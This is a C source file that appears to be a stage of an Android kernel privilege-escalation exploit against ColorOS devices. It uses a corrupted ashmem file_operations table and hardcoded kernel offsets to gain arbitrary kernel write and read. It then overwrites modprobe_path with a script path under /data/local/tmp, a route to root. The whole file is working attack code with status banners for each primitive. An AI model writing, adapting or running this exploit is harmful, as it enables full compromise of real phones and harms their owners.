/*
 * swap_probe v2: given a LIVE SLIDE_SWAP table (fake_fops), drive the full
 * primitive chain from a separate process with ZERO spray/churn:
 *   1. write test   (scratch on the sprayed page)
 *   2. llseek repair (undo change_child side-effect -> device stable)
 *   3. read test    (arm .read, pread, disarm -> verify readback)
 *   4. modprobe arm  (write our script path into modprobe_path)
 * Usage: swap_probe <fake_fops_hex> <slide_hex> [modprobe|nomodprobe]
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <stdint.h>

#define __ASHMEMIOC 0x77
#define ASHMEM_NAME_LEN 256
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#define KIMAGE 0xffffffc008000000ULL
#define OFF_NOOP_LLSEEK 0x181FE48ULL
#define OFF_CFG_READ 0x182FCF8ULL
#define OFF_ASH_RDITER 0x1822948ULL
#define OFF_MODPROBE_PATH 0x27E0F78ULL

#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_CB_MAX_SIZE_OFF 100
#define PREFIX 11

static uint64_t g_slide;
static uintptr_t g_fake_fops;
static int g_fd;

static uintptr_t slid(uint64_t off) { return (uintptr_t)(KIMAGE + g_slide + off); }

static void put64(unsigned char *p, size_t off, uint64_t v) { memcpy(p + off, &v, 8); }
static void put32(unsigned char *p, size_t off, uint32_t v) { memcpy(p + off, &v, 4); }

static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < len; i++) name[i] = blob[i] ? blob[i] : 1;
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < pos; i++) name[i] = blob[i] ? blob[i] : 1;
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int set_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) return -1;
  for (size_t i = len; i > 0; i--)
    if (blob[i - 1] == 0 && try_put_blob_zero_at(fd, blob, i - 1) != 0) return -1;
  return 0;
}

static ssize_t kwrite(uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - PREFIX, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - PREFIX, (uint32_t)len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - PREFIX, 0);
  if (set_name_blob(g_fd, blob, sizeof(blob)) != 0) return -1;
  errno = 0;
  return pwrite(g_fd, data, len, 0);
}

static ssize_t kread(uintptr_t target, void *data, size_t len) {
  /* arm .read, zero read_iter */
  uint64_t cfg_r = slid(OFF_CFG_READ);
  uint64_t zero = 0;
  if (kwrite(g_fake_fops + 0x10, &cfg_r, 8) != 8) return -10;
  if (kwrite(g_fake_fops + 0x20, &zero, 8) != 8) return -11;

  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = 0x1000;
  if ((size_t)pos < len) pos = (off_t)len + 0x100;
  put64(blob, CFG_BIN_BUFFER_OFF - PREFIX, (uint64_t)(target - (uintptr_t)pos));
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - PREFIX, (uint32_t)pos + (uint32_t)len);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - PREFIX, 0);
  put32(blob, CFG_CB_MAX_SIZE_OFF - PREFIX, 0);
  ssize_t rd = -1;
  if (set_name_blob(g_fd, blob, sizeof(blob)) == 0) {
    errno = 0;
    rd = pread(g_fd, data, len, pos);
  }
  /* disarm: .read=0, read_iter=real */
  kwrite(g_fake_fops + 0x10, &zero, 8);
  uint64_t real_rd = slid(OFF_ASH_RDITER);
  kwrite(g_fake_fops + 0x20, &real_rd, 8);
  return rd;
}

int main(int argc, char **argv) {
  if (argc < 3) {
    fprintf(stderr, "usage: %s fake_fops_hex slide_hex [modprobe|nomodprobe]\n", argv[0]);
    return 2;
  }
  g_fake_fops = (uintptr_t)strtoull(argv[1], NULL, 0);
  g_slide = strtoull(argv[2], NULL, 0);
  int do_modprobe = (argc > 3) ? !strcmp(argv[3], "modprobe") : 1;

  /* ColorOS: real node is /dev/ashmem<boot_id>; bare /dev/ashmem is often EACCES
   * (SELinux) and never reaches misc_open. Scan same-rdev names. */
  {
    const char *cands[8];
    char extra[8][256];
    int nc = 0;
    cands[nc++] = "/dev/ashmem";
    DIR *d = opendir("/dev");
    if (d) {
      struct dirent *de;
      while ((de = readdir(d)) != NULL && nc < 8) {
        if (strncmp(de->d_name, "ashmem", 6) != 0) continue;
        if (strcmp(de->d_name, "ashmem") == 0) continue;
        snprintf(extra[nc], sizeof(extra[0]), "/dev/%s", de->d_name);
        cands[nc] = extra[nc];
        nc++;
      }
      closedir(d);
    }
    g_fd = -1;
    for (int i = 0; i < nc; i++) {
      errno = 0;
      int fd = open(cands[i], O_RDWR | O_CLOEXEC);
      printf("open %s -> fd=%d errno=%d\n", cands[i], fd, errno);
      fflush(stdout);
      if (fd >= 0) { g_fd = fd; break; }
    }
  }
  if (g_fd < 0) { printf("open failed all ashmem nodes\n"); return 1; }
  printf("open ok fd=%d fake_fops=%llx slide=%llx\n", g_fd,
         (unsigned long long)g_fake_fops, (unsigned long long)g_slide);

  /* 1. write test */
  const char marker[] = "GLPROBE1";
  ssize_t w1 = kwrite(g_fake_fops + 0x700, marker, 8);
  printf("W1 ret=%zd errno=%d %s\n", w1, errno,
         w1 == 8 ? "*** ARBITRARY WRITE LIVE ***" : "(miss)");
  if (w1 != 8) { close(g_fd); return 1; }

  /* 2. llseek repair */
  uint64_t llseek = slid(OFF_NOOP_LLSEEK);
  ssize_t w2 = kwrite(g_fake_fops + 0x08, &llseek, 8);
  printf("W2(llseek repair) ret=%zd (noop_llseek=%llx)\n", w2,
         (unsigned long long)llseek);

  /* 3. read test */
  char rb[8] = {0};
  ssize_t r1 = kread(g_fake_fops + 0x700, rb, 8);
  printf("R1 ret=%zd back=%.8s %s\n", r1, rb,
         (r1 == 8 && !memcmp(rb, marker, 8)) ? "*** ARBITRARY READ LIVE ***" : "");

  /* 4. modprobe arm */
  if (do_modprobe) {
    const char mp[] = "/data/local/tmp/mp";
    ssize_t w3 = kwrite(slid(OFF_MODPROBE_PATH), mp, sizeof(mp));
    printf("W3(modprobe) ret=%zd -> %s\n", w3, mp);
  }
  close(g_fd);
  printf("PROBE DONE\n");
  return 0;
}
